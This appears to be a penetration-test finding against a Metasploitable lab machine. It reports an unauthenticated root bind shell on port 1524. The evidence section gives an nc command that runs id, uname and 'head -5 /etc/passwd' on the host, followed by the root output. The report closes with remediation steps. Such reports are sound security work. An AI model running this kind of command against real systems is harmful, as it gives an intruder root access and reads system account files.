title: Root Shell via Bind Shell (Port 1524 - Ingreslock Backdoor)
description: A root-level bind shell is listening on port 1524 (ingreslock). Any attacker can connect and obtain an interactive root shell with no authentication required. This provides complete system compromise with uid=0(root) access.
evidence:
Exploitation command: echo 'id && whoami && hostname && uname -a && head -5 /etc/passwd' | nc -w 5 192.168.0.140 1524

Output:
root@metasploitable:/# uid=0(root) gid=0(root) groups=0(root)
root
metasploitable
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
remediation: Remove the bind shell backdoor on port 1524. Investigate how the backdoor was installed and check for additional persistence mechanisms. Rebuild the system from a known-good image.
